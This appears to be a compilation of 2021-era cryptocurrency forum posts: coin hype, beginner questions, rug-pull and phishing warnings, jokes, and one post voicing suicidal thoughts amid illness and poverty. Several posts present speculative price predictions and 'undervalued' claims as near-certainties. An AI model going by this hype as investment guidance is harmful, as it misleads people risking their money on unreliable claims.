There is no question that the Brave/BAT team is making solid progress and this is reflected across growing user, content creator, and advertising company numbers. Sentiment around the Brave/BAT teams is high.

Recently, BAT just spiked up to \~$1.40 in price on HEAVY VOLUME, and has since been holding steadily at approximately $1.00 - $1.10 from bagholder shakeout.  Big money players are predicting some large events on the horizon that drove this initial spike.  KEEP A CLOSE EYE OUT.

Examining the use case of BAT, it's potential once it's widely adopted, it's scarcity, and user/creator/advertiser/investor sentiment, it's obvious that we've amassed a VERY strong amount of evidence suggesting that BAT is still undervalued. Even if we can argue that BAT is valued correctly right now at \~$1.00 ($1.5B in Market Cap - 10x's can happen quickly on low market cap projects), it's increasingly obvious that we won't be stuck at $1.00 for long. BAT has a very bright future ahead of it, and we're still in the early pre-mainstream phase where Brave/BAT is building up a strong pre-mainstream foundation for itself.

So Ive just noticed Binance have just launched the Polkadot parachain auctions and Ive done some research and Im gonna be going with moonbeam however Im still very clueless about a lot of stuff. Such as what exactly the rewards will be, when well get them etc also there seems to be a timer saying 20hrs when you click on if, does that mean they start in 20 hours or there is 20 hours to participate? 

Whatever info people can give on this topic will be helpful as a lot of it goes over my head because they use a lot of words that Ive never even heard of ha! Or maybe Im just stupid who knows! I realise its gonna lock up my DOT for 2 years and Im more than okay with this, Ive got a fat bag of DOT that Im holding long term anyway so may as well lock it up for benefits.

I am a young man, recently engaged with a baby on the way. As most of you I had some debts to take care of which were a weight I was carrying around for as long as I can remember. To make matters worse all of those were from close friends and relatives.  
Now, I am proud to announce that I cashed out 60% of my portfolio and have paid all my debts!   
I feel much better now, relationships with people close to me are no longer in danger, wifey and I can now feel much safer with our little guy on the way and I still have 40% in the game! 

I know some of you might say I did it wrong and I should have waited couple of months before doing this but I felt like I was right on the edge with friends and relatives and couple of months more could be too much to go back.  
Now that it's over I feel like a weight has been lifted off my chest and I can now breath freely!   
Crypto did it for me, made my life and the life of my family better. Hope it has more to give!

P.S. after cashing out I did some alt swapping and I am now 100% in DOT, which by the way just hit a new ATH on Kraken! Woo Hoo!

Ive only been in crypto since about April, luckily I didnt have too much invest before the May crash or I probably wouldnt be here now. 

I know that theres many people in this sub that have been around crypto for awhile. So what would you recommend for someone like me or others to prepare for an 80% crash. 

I know that theres no way of know when or if this will happen but Ive also seen many people saying that this time will be different due to recent adoption of crypto. Do you think this cycle will be different than previous ones or will we see a similar results that we have seen in previous years?

I will be filling my bags with AMP, HOT and CKB when ever possible and not touching them for then next 5 years.

Don't get me wrong, I still have the likes of:

BTC, ETH, ALGO, ONE, DOT, LUNA, AVAX, LINK

in my portfolio to name but a few.

But what coins have you picked up that don't get huge amounts of attention, but you've got a bag to Hodl for the next few years? 

Be interesting to see, as I'd like to research a few more...and by research I mean blindly buy and cross my fingers if they get enough mentions on here.

Most, if not all coins and exchanges are so unintuitive and hard to use that it takes a while for even experienced traders to be able to understand them. And it certainly doesn't help that many of them are unintuitive in completely different ways, only making the issue worse.

I'm the "IT guy" in my family, the one they always call to fix their "wifi" or "download more ram", and even I've had a lot of trouble figuring out how some cryptos and exchanges worked. This does not bode well for the less tech-literate population that has trouble even googling things. 

Implementing homebanking and online banks took a while already, and those were relatively simple to learn. If we want crypto to be used more widely and by a bigger range of people than just millenials and teenagers, something should be done to streamline the experience so it's easier for people to get into crypto.

What do you think could be good ways to go about it? A new simplified exchange altogether? More access to information and tutorials? Already existing exchanges and cryptos streamlining their UI? I'm curious to know what y'all think.

Hi I'm 20Y M from India. I'm dealing with Slipped disc, Cervical &amp; Sinusitis (sinus infection) from past 7 months. I had just started doing work as a construction worker this Jan. I injured my back in Feb at the construction site. Then I don't know I started feeling pain in my entire spine for 1 month. In April my spinal &amp; neck pain went at it's peak and I thought I would die. I somehow managed that pain ( didn't had any other option ). Then i got sinus infection due to pneumonia in May. I went to few doctors whatever i could afford, but then reaching out to doctors was out of my budget. Yesterday I was in intense pain &amp; really thought of committing suicide due to no hope. It's been 7 months of this. Today I went to a Dr. for a normal dose of cold &amp; he advised me to do a sinus scan. They did the sinus scan and i have sinus infection from almost 6 months. They said I need to get a surgery for the sinus. I can't afford the surgery, because i only have money to survive this year. I don't have any family or anyone that can help, that's why I started working as construction worker. I don't know what to do, I can't work as a construction worker anymore due to spine issues &amp; if I don't work I won't have money to survive next year. I'm really scared of what will happen next. Either I'm gonna die due to lack of food or I'm gonna die because of this pain. I'm stuck now. I'm having suicidall thoughts but I don't have the power to kill myself. I don't want to die like this.. Please anyone suggest me any way that I'm not able to see. I know there's always a door to get out of any situation, but I'm unable to see it due to so much stress

Hello guys,

#This is not moon farming post or joke, its a true story just happened to me today morning, I will 

I was sleeping in my bed as normal, then I was dreaming that I wake up ( like it was real not dream ) on a lot of voice in the street and when I open balcony to check whats there I saw a space ship  and Aliens  were occupying Earth 

I didnt care about my life, apartment, business or any thing but I just had one question in my brain **Should I buy more BTC or sell what I have?**

When I wake up I was surprised, and when I told my wife she laugh ( she knows I do trading in something but dont know if its stocks or gold or crypto or whatever )  and she advice me to stop whatever I am doing

I dont know if I should take rest or its just a dream 

So what do you think guys ?

I'm a big supporter of crypto and the good it can do for the world, and I fully expect it to become an integral part of the economy in years to come.

But I'm aware that right now crypto has problems. If it didn't, there wouldn't be so many great coins trying to solve them. But the more I look in this sub, the more I find people trying to unreasonably defend these issues, not by claiming that solutions are being worked on, but by pretending that said problems don't exist or just relying on whataboutism.

The first of these problems is energy consumption. Yes, Bitcoin and NFTs do consume an incredible amount of energy, and no they are in no way enviromentally friendly or green. Crypto's energy issues is a big deal, and it's not something that should be handwaved. Even so, I've seen many people saying that it's not an issue, or pointing toward banks because they use even more energy and calling it a day, like that somehow erases the problem.

I've also seen people be dismissive of those suffering the effects from that high energy usage. In a recent post about how illegal crypto farms in Iran are projected to cause massive power outages in the future, there were multiple comments either blaming it all on the government or dismissing the consequences such power outages might have on the non-farmers living there.

It reminds me of many reactions I've seen to El Salvador's crypto adoption. Like Vitalik said, crypto should mean freedom, and as much as we want it to be adopted officially by many countries, forcing crypto on people isn't the best way to go about it. And yet it was called "a necessary sacrifice" by people here. Yes, it's easy to say that when you're not the one making those sacrifices.

I've also seen it with the problem of crypto (especially certain coins and exchanges) becoming too complex and hard to use/understand. When calling for a possible future where these services are more streamlined and user-friendly, many said that if people are too dumb to learn how to use them, then they didn't deserve to be in crypto. That just seems very dismissive to me. Like a lot of people are lacking in empathy.

All in all, I feel like we could all stand to take a step back and look at the bigger picture. By aknowledging the flaws in crypto, we can start working toward solving them, and building a better future for everyone involved. We're not doing anyone (much less ourselves) any favors by acting like shitcoin shills and blindly praising crypto forever.

TRAC pumped 450% after Coinbase listing. Will LTO follow the exact same scenario?

Those two projects were compared during the last year, but then TRAC decided to change concept a bit (as far as I know). 

There are still some metaphorical points that match when you compare those two. Both have working product, both get their fair share of adoption, both have good/great tokenomics and great growth potential. 

Ive held both tokens for a while but went all in on LTO after UN announcement -

https://unhabitat.org/un-habitat-oict-and-lto-network-release-first-open-source-urban-land-registry-solution-for-the

So with LTO you have a project that aim to address the next big thing - decentralized identities and verifiable credentials. I think that everyone involved in crypto should read those two reports in order to understand how big of a deal decentralized identities (DIDs) and verifiable credentials (VCs) are:

1. https://ec.europa.eu/futurium/en/system/files/ged/eidas_supported_ssi_may_2019_0.pdf

2. https://www2.deloitte.com/ie/en/pages/financial-services/articles/digital-identity-wef.html

Not only that but GoLand project is still being live and there are many great things happening with LTO through their partner Sphereon - https://sphereon.com/  Just a quick example: 

https://www.efe.com/efe/usa/comunicados/lto-network-and-sphereon-partner-with-triall-for-world-s-first-application-of-blockchain-technology-to-covid-19-clinical-trials/50000209-MULTIMEDIAE_4623864


LTO was also listed on KuCoin a week ago (or something like that) making it possible for US investors to buy, hold and stake. There was also a trading competition going on for someone who is interested- https://m.kucoin.com/news/en-lto-network-listing-carnival-share-a-massive-165000lto-grand-prize-pool 

The new Cobalt mainnet update opens up a lot of new possibilities for LTO. NFT 2.0 and sponsored transactions being most anticipated. There are also rumors about LTO being involved with metaverse projects which is just a great news. You can read about mainnet update here - https://blog.ltonetwork.com/cobalt-update/

So my point is that LTO have all the chances of pumping like a mad bull on some roids after coinbase listing. From the last AMA and various discussions on telegram I made conclusion that they, team and devs, are almost done with the Rosetta which is a great news to hear. Talks about listing were going in the community for quite some time, but team have a great track record of delivering promises so I think that that will happen eventually. What do you guys think?

I'm always intrigued what gets people involved with crypto. Every time we have a bull market we inevitably get a lot of new users, but starting from 2013 crypto has had lots of media attention, with frequent spikes including 2017, 2020 and then again this last few weeks.

Pretty much everyone knows about crypto at this point, even if they don't understand it. So given many of you have now chosen to embrace the dark side and join the blockchain party - why did you keep us waiting?

Was it fear? A lack of understanding? Did you suspect it was all a scam? Were the on-ramps too complex?

What was it that meant that for years you were unwilling to test the waters, until more recently?

Please don't interpret this as criticism - everyone finds crypto in their own time, and a lot of it depends on the sort of social circles you hang about in. But I'm genuinely interested in how the most recent recruits found us, and what had kept them away for the last decade?

Bitcoin has been created 2009. 

Since the beginning there have been quite some addresses created.

# the richest Bitcoin addresses 
The BitInfoCharts website ( https://bitinfocharts.com/top-100-richest-bitcoin-addresses.html ) tracks bitcoin distribution across all addresses. 
Someone who has not seen this information will probably be shocked.

* Of the total 38.5 million addresses, slightly more than half contain only 0 - 0.001 BTC. 

* On the other hand, the majority of bitocoins (63%) are in wallets with more than 100 BTC in them (so more than $6M). 

* Moreover, 79 addresses have more than 10,000 BTC, totaling 2.5 million BTC, which is 13% of the current total circulating bitcoin supply.

* Binance has more than 547,888 BTC in their wallets (which is 3% of all BTC)

# the dormant Bitcoin addresses 
Even more shocking is the amount of dormant addresses and their Bitcoins.
A dormant address is a BTC wallet that has not had any transactions for a very long period of time.

On the same website you can also find detailed statistics of these addresses, https://bitinfocharts.com/top-100-dormant_9y-bitcoin-addresses.html

* In total at least 2.51 M BTC ($160 billion) is in those dormant addresses, so 13% of the current total circulating bitcoin supply! Untouched since 9 years.

* The biggest dormant address, 1FeexV6bAHb8ybZjqQMjJrcCrHGW9sb6uF, has 79,957 BTC (~$5 billion) or 0.42 of the total circulating bitcoin supply alone.

* Of the Top 10 dormant address, all of them have received their last Bitcoin in the previous 2 years! (Most of them however are dust attacks to find out their real owner)
	
All of these addresses are likely a mix of very rich long-term HODLers or more very likely cases of lost wallets (so Bitcoins permanently lost from circulation)!

Im having a hard time understanding the relationship between the Assets (such as all the coins out there) and the Networks that are tied to these coins. 

Whats the relationship? What role does ERC20 or otherwise play into the coin? Does its structure determine its value? 

You may get a sense that Im a noob from the question and I am. Ive believed in various coins/networks like Solana for a while, but why invest in the Solana coin when I could buy Raydium, something that seems to be more likely used for transacting on the Solana blockchain. 

Any explanation to make the whole relationship between coins and their networks would be very helpful. And any explanation on how there could be so many assets (or currencies) would be appreciated. 

Thanks so much and excuse my noob-ness.

First, let me get my shame out of the way. I started off on Robinhood, and stayed on Robinhood. So far it's all I have used (except for Voyager for the free $100 in BTC I was rewarded!). I am a low experience, long-game holder.

I have been doing as much accredited research as possible. There are tons of lists, videos, shitposts, and everything else showing all the same ten-ish crypto exchanges in different orders seemingly based on a poster's personal opinion. 

For context, I am looking at crypto gaming to be something ground breaking in the coming years. I want to invest as well as play them. This led me down the rabbit hole and understanding that Robinhood will not be so supportive in that endeavor (please, burn me kindly in the comments). 

So far, I see Coinbase, and I see Binance based on the biased information I have dug up. Now, I am asking for your opnion (with several liberal heaps of salt, tehe). I know Binance seems divisive, but the arguments are not so consistent. I just don't want another Robinhood roadblock. 

Given my use case, what do you think would be a good exchange to make my new nest in? Any information and supporting details would be much appreciated! 

&amp;#x200B;

PS. Any comments, relevant, harsh or not, will get my upvote, just for your time.

I love this sub so much, but the only thing I hate about it is how fast the sentiment switches from We will be billionaires in a year to its all over, sell all your crypto before its too late

Same things goes with coins. Look at MATIC for example. Although theyre a project with one of the best technologies on the market and has so many great projects and collaborations, it was struggling for a while in terms of price. However since September 26th it has been experiencing a rally with a great 74% in price.

Its getting soooo much love on this sub right now (which is great, MATIC is one of my favorites actually). But if you go back a couple months ago, some people were trashing it and these are the same people that are buying up MATIC tokens right now lmao. Gotta love the irony

Hi guys. I would like you to share your opinions on this strategy. I've a good bag of some coin that I think is going to print damn green candles for the following weeks. 

What do yall think about liquidating the coins and reinvesting leveraged on the same coin? Is there another way to do this in front of my eyes that I've not noticed yet?

Love ya

# Possible Massive slow rug pull ( Reward Cycle )

**DISCUSSION**

PLEASE READ.

There is a brand new crypto being spread all over and other social medias call EVERGROW (0x229a54Fb9De889C271380452C0483ce89b8C1e0D ) and I have SOLID proof something is FISHY.

1.) The Dev wallet is still UNLOCKED.

2.) The Dev wallet has tricky paper trails leading to multiple addresses holding 1 TRILLION coins each using something called Disperse . app 

3.) The Subreddit just became LOCKED you have to request to post something

4.) The devs have the ability to LOCK TRADING, CHANGE SALES TAX, AND BUY TAX

Currently this token has a 1.7 Million market cap..

Lord have mercy on everyones money.

If I'm wrong please correct me because I'm FLAMING their telegram, subreddit, and anywhere I can.

I mean cmon, this is a big tell. I can understand skepticism but seriously. If your mind isn't open enough to even dabble in crypto, Thats a Super Big Tell. No excuses now. Big tell on the parties priorities.

Like its been 10 years basically and some people are really blind to crypto. Where is your head at. I get it people are busy, focused, but....idk about giving them a pass on being blind, by how big crypto is today. Red flag imo!

2021 and somehow your still skeptical about crypto, there is no way that should be positive when sitting down and thinking if this person would be a good person to get into a relationship with.

BEST Filter Ever, should be the future minimum i swear haha.

Would you still date someone that doesn't know about crypto in 2021?

I hope I don't sound like an idiot, but I'll try my best...

&amp;#x200B;

I invest monthly in a 529 plan for my childs college fund. I like it because it automatically invests for me each month, is pretty easy to set and forget, and I don't track each item in there, making it easy to grow over time and not get emotional.

&amp;#x200B;

Is there something in the cryptocurrency space where I can automatically invest in 4-6 different cryptocurrencies each month, set it and forget it (perhaps in a Trezor wallet), with minimal to no manual buying or selling on my part after set up?

I am a CS student and I wanted to set my foot into something new. So, I've recently taken up the blockchain technology  and want to make a dApp for my college project. I want to take my time to research everything but my prof is rushing me to give him a final proposal. I would really appreciate some ideas for a project. I have sufficient time to learn everything required. But, I need to give a final proposal keeping the expenses in mind, which frankly, I have no idea about. I can't really afford to make a very expensive project, but I think there must be some ways around it. Any help would be appreciated.

Which coin is ACTUALLY a hidden gem? Earlier this year I discovered this coin called Origin Trail. Its the first ever decentralized knowledge graph. Multi-chain, partnerships with dozens of companies including Home Depot. This thing wasnt even 100m mcap nowhere NEAR the top 300. 

I dumped my whole life into this coin and it is finally just now getting its recognition it deserves. 

So my question to you all. 3 million minds combining the entire markets knowledge, whats the next Origin Trail? A truly original project with goals and a future that just for some reason is not getting the press it deserves.

Back when I had first thought about investing in crypto, I had discussed it with some friends and family. Everyone said "Don't do it, it's a scam!" and had a chuckle at my naivete. Of course, no one had actually read up on it. 

Now? Now I am respected for being so "smart." Now people wait to hear what I have to say before they speak. Now they wish they had listened to me. Now they ask me what I think about their investments. 

It's weird how much respect I get for making money. All I did was look at the declining US dollar and throw a hail mary. Fortune favors the brave and all that.

In the past few weeks I've seen quite a few redditors commenting about things they spent money but quit to have more FIAT to invest.

I didn't really have a vice but used to go on dates quite frequently that didn't add anything of value to my personal life but frequently took a toll on my income. Now I am using the same money investing monthly on crypto and slowly build my poverty wallet.

How about you? What were changes you did to your life to help investing? And besides the crypto what benefits did you feel with this change?

I know quit a few people are going to look at this and start laughing. But let me explain. Last week ACH was on a downward, with drops as low as .0440. However a couple days ago the official partnership plan for the crypto cards was in the news and its went high since then. At the time of posting this the highest peak of the day is  around .0980 and honestly I feel like its not done. Considering they still havent even listed on Binance yet, I think it could definitely gain more altitude in the beginning of the next year. Also, dont take this as advice to buy ACH. Im a amateur to this, simply sharing my analysis.

There might be already a sequel in the making for the Squid Game Rugpull season 1 actually! According to coinmarketcap the controversial token is up approximately 288% in the last 24 hours. This is unbelievable and baffles me to be honest. How is it even possible?

https://coinmarketcap.com/nl/currencies/squid-game/

Did people not learn about what happened within a spam of 10 minutes to Squid Game? Do you think people still bought the rugpull dip after the price crashed and are bound for yet another surprise soon?

Time will make us learn, thats for sure. Grab your popcorn and enjoy a possible rugpull vol. 2 in the making for Squid Game in the meantime!

I loved collectible cards games growing up, and I decided to make one on Ethereum^1.

That game will be Khans, a TCG where you (through a Khans card), lead Champion cards to battle, using Item and Action cards to help your Champions.

The game will be obviously running on classic web2 (initially at least, like other games, Axie Infinity^2 for example) while all aspects of ownership and governance will be onchain ^3. Play2Earn capabilities will happen on the web2 part but will allow any player to convert their gains to cards or tokens.

Honestly just working with artists on [cards design](https://khansgame.com/assets/images/Hero%20card%20design%201%20d.png) made me want to own them myself lol.

I'm sharing my project with y'all to get some interest, feedback, and invite you to stay tuned by [following the twitter](https://twitter.com/khansgame).

PS: Nothing is released yet, the project is very much in the early stages.

^1 *And more EVM based blockchain down the road, at least ones with NFT bridge capabilities in place.*

^2 *Until a workable, fast and cheap solution is available for production that can accommodate a game needs for computation.*

^3 *ERC1155 will power cards ownership, and every card will have limited supply, beside beginners cards which will have an infinite supply to make everyone able to participate and have fun.*

Would love to hear what you guys think about my project!

The quality of this subreddit has gone downhill. It's abysmal.

Every 15 min or so, there's a new "shill your coin" thread, disguised under various title, such as "what's a low marketcap gem?" or "I have 500$ to gamble, which x100 token should I buy?".

We all know those threads. 

Even if the OP asks for detailed answers, 99% of the commenters do not read the post. E.g. : - what's a low marketcap... - ADA! - SHIB.

We frequent this subreddit. Low-efforts comments and post should not be rewarded, even if they name your favourite token. On the opposite, they need to be penalised and the only way to do that is to downvote shitty, stupid, low-efforts comments. 

Maybe if people on this subreddit notice that this kind of comments are actually getting downvoted, we could all enjoy the subreddit more.

So basically, I startes investing 2 months ago, and everything went alright, but I wanted more. So as soon as Shib was available on coinbase I thought, this might be the invest 1$ and receive 100000$ coin. So I went all in. And it even did perform as I expected. But now, ai wanted to learn more about shiba. Then I realited thath this coon has absolute 0 future (market cap). And on the shib sib reddit, as I pointed this out, I got hella flamed and recieved like 300 downvotes haha.
Then I realized that this coin is only followed by newbies who jumped on the hype train.

So basically, do your research and dont be greedy when it comes to investing!!

So a few days ago I asked what others think about crypto in the metaverse and someone suggested that we make a chat on it. I couldn't see why not, so here we are.

&amp;#x200B;

NOTE: there isn't a hard definition on what the metaverse is. From what I can find this is it.

1. A universe that you control a player and have the ability in changing part or all of. But the overall game has no goal. Note this includes things like Minecraft.  A side requirement for many is it must be multiplayer. Again, Minecraft and even Star Citizen does fall in this.
2. A multiplayer universe in which a player can generate items. Examples of this is Second Life, Decentraland, and a number of other places.
3. A multiplayer universe in which it connects to other multiplayer universes or outside areas. So like if you see an ad in the metaverse and touch it. If the ad is for the newest phone, it will take you to it's site.
4. A SP or normally MP universe in which you own assets or create assets. But with AR (Augmented Reality) you can place them and keep them in the real world.
5. Some mix of above

&amp;#x200B;

Now how is this related to crypto?

Many metaverses are looking at NFT and crypto to help out with ownership of items. So like if you got a shirt in the metaverse that shirt will be a NFT. And in some cases you can use crypto to buy items from other players who designed stuff you can use in the metaverse.

Some metaverses are purely on the blockchain. For example, Decentraland is on the ETH chain.

I see a lot of people in it to win or hodl til a financial goal has been met, but on the other hand, I see people taking out their initial investment, every other day. What is a good initial investment into crypto in 2021-2022?, 
crypto in 2017, I heard once $1400 US, was a good set initial investment, but things have changed since than, the crypto world has evolved. Some have put all theyre saving into crypto and lost, some have risked 10 % of theyre saving and won big and as I read now through Reddit I see people investing advice or asking for help with strategies to win big. Two strategies Ive noticed while talking to associates and friends about crypto (small amounts per coin). For example, BTC someone with minimum experience would top of their wallet ( any platform ) $100 us and buy 100 shares of BTC and just let it sit there (good or bad move?). (big amount per coin) someone would invest $1000 on one coin, cash out at a high peak during the day (is this daily crypto trading?), what is a reasonable strategy to attack the crypto trading world of today ? And how much time should be invested as well?
-------------------------------
1 : 2021-11-03
Ive been a long time follower of crypto and just recently started purchasing some different coins (starting with BTC/ETH and a couple of the bigger Altcoins). I wish I didnt start buying at the all time high for both of these but I believe in what they are about and that they will continue to rise in the future.

With that being said, Im aware I know next to nothing about crypto. So where is the best places you guys have found to learn? Is there good YouTube channels or websites that are recommended?

Im currently using Coinbase like Im sure 90% of beginners do. So Im also open to any suggestions on what platforms/wallets to use.

Thanks in advance, any little bit of information will help!

A couple months back, Venmo offered $25 to anyone that bought $25 or more in crypto on their platform. I took advantage and bought $25 in ETH. 

I posted about the promo and while some people were grateful for the intel, others shit all over that. 

Now that $25 investment is worth $67. It ain't much, but it's something. I just wanted to say that I am still happy with that investment and I think folks should keep an eye out for promotions like that.

ETH is just gonna keep on rising, so I'm just gonna let it ride into oblivion.

Venmo, Paypal might suck in a lot of ways but for some, these are trusted institutions and a great introduction for crypto for people that might not know how or feel skeptical.

It's difficult for people to hop onboard a movement when they hear "Hop on PancakeSwap and buy some Shibi Inu, according to PooCoin it's going parabolic".

It's much easier to say, "Buy some bitcoin on Paypal and see where it goes."

Anyway, that's my spiel.

Don't hate. Keep it positive.

When typing 'Sushi Swap' on Google, the top search is an advert for a scam Sushi Swap website: 

http://imgur.com/gallery/mwH97Yh

Notice how it's written "sushiswanp" instead of "sushiswap". It's a phishing website. I accidentally clicked on it while mindlessly navigating to what I thought was the official website. 

I immediately realised the typo and I managed to close my browser before the page loaded, but it still managed to invade. I was lucky that my antivirus picked it up and blocked it, however I do not know what it might have missed.

I'll be doing a full sweep of my PC tonight.
I'm pretty insecure about it. I didn't manage to see if their scam website was an exact replica of the official Sushi Swap but I suspect it is. 

Be careful out there everyone, it's bloody full of sharks.

Really guys, I just checked CMC and Bitcoin has the highest market cap of all crypto currencies. I came here expecting everyone to be talking about this fact but instead I see all these posts about Polkadot hitting a new all time high and such-and-such is in the top ten... but nobody is pointing out that Bitcoin is number one. Does anyone else think Bitcoin is undervalued rn? You'd think for having the biggest market cap it would be pumping like 2x to 5x right now, but instead it's just up maybe 50%. Seems like a hidden gem to me.

At it's high of around $2,300 with a total/circulating supply of 800,000,000, SQUID briefly hit a market cap of 1,840,000,000,000. That's 1.84 *trillion* dollars. I think we can all agree that $1.84T did not actually flow into this coin so what does that mean? I believe it means that market cap is actually based on what people are paying for a coin rather than it's actual price. For example, if the price of a coin is $1 with a circulating supply of 10, the market cap should be $10. But if someone was willing to pay $2 for that coin, the market cap would reflect a value of $20 even though that's double the actual market cap. If this is the case, then the argument for market cap being a limiting factor on price is invalid. 

Thoughts?

Its been on the market for a while, and today it sold. A gold King Julian for 50k usd. This on the heels of a 700k usd sale for a region, which originally sold for 15k usd. (A region is 1000 plots. Plots originally cost 20 bucks each and are now trading for 700+ usd)

The NFT gaming space is bringing in unreal returns and being early on the next Splinterlands or Axies will be life changing. Ive expanded into Million on Mars and Aavegotchi but the list is long and growing every day. 

Im curious what some other people are bullish on!

Tell me what you saw, I might guess what it is. Someone should create a Cookie Game token based on the Squid Game revolution. It's obviously not created yet, and will be. That's right, (we're) using cookies. Inspired by tik tokker @andrewdevitre and research into Cookie Game which does not exist, which led to rigwars circa 2015. They were heating sugar. I post this predictive hint to a potential hundred million dollar blockchain game and it might be a rug pull. 

Got anything?

**I started following Crypto and became member of the sub almost at the same time approximately 5 months ago. Here is what I've learned so far, thanks to you helpful people.** 

**Feel free to add more wisdom to the list.**

1. Buy High Sell Low- sometimes you just buy, no chance to even sell.
2. Don't put all your eggs in one basket - diversify your portfolio. Don't only buy Squid Game, buy also ElonBabyLoki, Elon Sperm, Monkey Jizz etc.
3. DYOR - read the first two comments in "shill me a coin post", search in google the three letter abbreviation and buy them straight away. 
4. Lot's of fun with helpful people - whenever you are asking for help, good Samaritans are reaching you for help with DMs about your 12 word seed phrase. 
5. Many boat accidents - i think i was too late for this, still didn't get it, will be thankful to clarify it for me.
6. Buy the dip - you are rugpulled with obvious scam coin. The price dipped almost 100 %. Perfect time to buy the dip.
7. Meme Coins are bad - someone became rich with SHIBA but of course it's not you. 
8. Keep the value of your portfolio to yourself - sure, keep the grave secret of your $100 holdings.

That was a wild freaking ride. Today was a damn good day, the first day I made a solid profit by trading. Got in after the run up started and still managed to get 15% profit. The one thing I learned today is if you fomo in early enough, you can definitely squeeze out a profit. I work in the medical field and I made 1/3rd of my monthly salary in 2 freaking hours. This is insane, crypto totally is a game changer for the average person. Wish I could convince fore of my family and friends to get into this. I feel like I'm gonna jizz everytime I think of my portfolio , 5 years into the future. Looking at the volatility in crypto, we are still very early , there is huge money to be made. This is a vast unexplored marketplace with potential beyond our wildest dreams. I wanna add a word of thanks to this subreddit too, you guys have been great to me. All the best everyone and happy investing.

Can I get some advice on the cheapest way to sell coins to buy other coins? 

I got into crypto near the end of August of this year and havent sold anything yet. 
Is it cheaper to exchange the coin for USDC or its better to just sell it for fiat and then go buy the new coin? 
Or is there another way to exchange coins. 
Im only on one platform which is crypto.com and dont see many options. 
I tried to sell a coin and its somewhere close to 5% or so just to sell. Is that normal or crypto.com is just charging too much.

The utility token is used as payment for access to my software API. Customers buy the tokens from me(company) and then exchange them with me(company) for the service.

During the ICO I want to sell tokes at a value of $0,01 (one API call). I have multiple customers lined up and Im expected to sell about 100 million tokens.

Because it takes the customer(s) time to integrate the API into their existing software I expect 10 million API calls in the first year, with an increase in calls/usage each year.

I would like the token to increase in value as usage increases (this could be accomplished by burning tokens when customers exchange them for the service).

Im currently trying to model this out in a spreadsheet but I have an issue with valuation:

Using standard formulas like MV=PQ it gives a very skewed valuation result because only 10% (10 million API calls) of the token supply is being exchanged.

What formulas should I use to get a realistic valuation?

One potential solution is to keep the market cap the same i.e:

100 million tokens \* $0,01 = $1 million

token valuation = $1 million / 100 million tokens = $0,01

With a burn rate of 50% after the first year the token supply is decreased to 95 million tokens (if 10 million API calls \* 50% burn). which means the valuation is now: $1 million / 95 million tokens = $0,0105 which is a small increase in price. 

Is this a correct way of solving this?

Profited quite abit from ethereum hitting ATH the other day and took quite abit of profit. Im deciding on spending a small portion of it on smaller projects with smaller market cap in hopes of potential 50x so that I can pay some of my sons mortgage off.

Its tough to see which has potential and those in top 100 are mostly not going to 50-100x due to their larger market cap. 

Saw a few posts about people asking about smaller coins and harmony ONE kept popping up back then and it really did pop off in its run.

Not seeking financial advice here but rather want to hear the communitys opinion on the next potential coins. 

Thanks for any of the suggestions!

There have been way too many one-sided posts shilling Loopring lately due to GME head of blockchain research and its recent market action. Before you jump in and blindly buy LRC, please DYOR.

Loopring is a ZK Rollup platform and exchange originally founded in China. ZK rollups are very computationally-intensive and require strong infrastructure to process. The same goes with running nodes. Loopring calls itself a DEX, but it's towards the centralized end of the spectrum. It's able to operate feeless because it runs similarly to a CEX on a backend, except that it stores its transactions in a public Merkle tree. For customers, it makes sense mainly if you send out often on the Ethereum network.

The biggest issue is that it costs massive ETH gas fees to move from Layer 1 to Layer 2. It also costs fees to move back to L2, though that's much, [much cheaper](https://l2fees.info/) because it's aggregated (which also means it could take a couple of hours depending on usage). It's about 60K gas units to move to Layer 2 because it requires using its smart contract. [We have users earlier this week reporting $300 gas fees to create the Layer 2 wallet](
https://np.reddit.com/r/loopringorg/comments/qiser5/why_it_is_so_expensive_to_move_eth_from_loopring/). Every time you want to move more funds to Layer 2, you will need to pay additional gas fees, so if you want to use it efficiently, you'll need to onboard as rarely as possible by whaling into the platform. Someone else mentioned counterfactual wallets yesterday, but that's just try-before-you-buy and doesn't address this issue at all.

Given those fees, I'm not sure how Gamestop can use this since I doubt its customers are going to want to pay a $100-300+ onboarding fee. I suppose Loopring could just turn into a full CEX and introduce Layer 2 fiat onramps, but that kind of defeats the purpose. Other larger CEXs could introduce their own ZK Rollup solutions and beat them at their own game. Or you could use a sidechain solution with ZK Rollups.

While you can always recover your funds on Layer 1 if Loopring ever goes down, it's also very expensive and impractical for smaller users. Someone did a test earlier this year and calculated that it takes about [1.3 million gas](https://medium.com/loopring-protocol/withdraw-from-loopring-3-1-the-first-ever-experiment-of-shutting-down-a-zkrollup-24e6f333ca57) (more or less depending on the token) to perform Merkle tree withdrawal, which is currently over $1000.

Profited quite abit from ethereum hitting ATH the other day and took quite abit of profit. Im deciding on spending a small portion of it on smaller projects with smaller market cap in hopes of potential 50x so that I can pay some of my sons mortgage off.

Its tough to see which has potential and those in top 100 are mostly not going to 50-100x due to their larger market cap. 

Saw a few posts about people asking about smaller coins and harmony ONE kept popping up back then and it really did pop off in its run.

Not seeking financial advice here but rather want to hear the communitys opinion on the next potential coins. 

Thanks for any of the suggestions!

Its unfortunate that even being a centralized chain they do not try to stop or avoid scams.

I invest in coins on bsc because eth fees are high and other blockchains investment process is just too difficult. Do we have some straight forward resources for investors:

1. DOT Para chains and auctions are cool but I don't want to lock my investment for 20,30 or 40 weeks. how can in invest in projects coming on DOT without locking my crypto?
2. I have seen ***charles*** hoskinson interview with lex fridman and I think peer reviewing updates before implementing is the right approach; but how would I invest in new tokens in ADA?
3. I will try sushiswap for eth, and tinyman for algorand. more suggestions?

BSC has given me 9x and 4x on an average day but its getting harder and harder to spot good projects and i need to move to other ecosystems as i have chosen to do this full time. Please educate me on this.

Hey all, Mr smol dong clocking in with a hot take. But from my personal experience, crypto is not volatile even in the slightest. I yoloed my 99 Honda Civic, 3rd kidney, and my life savings of $420.69 into one coin last year exactly. Guess what Im up on that coin? I bet youre thinking I at least doubled my money right? Wrong, the coin Im in has gone up .000000001% 
Thats right, crypto is not volatile, Im going back to stocks where I can easily make 6% a year. Or maybe Ill just buy a piece of gold since thats apparently doing good too. 
All I know is that this USDT coin is starting to get boring.

Guys, when I say Im bullish on Elrond, I really mean it. I was in at just over $70 and have been pumping money into it these last months. I believe that Elrond is far better than most all of these networks being hyped up and Ill explain why.

Number 1... its fucking really cheap, the latency is insanely fast, it has immense scalability and virtually zero carbon footprint!

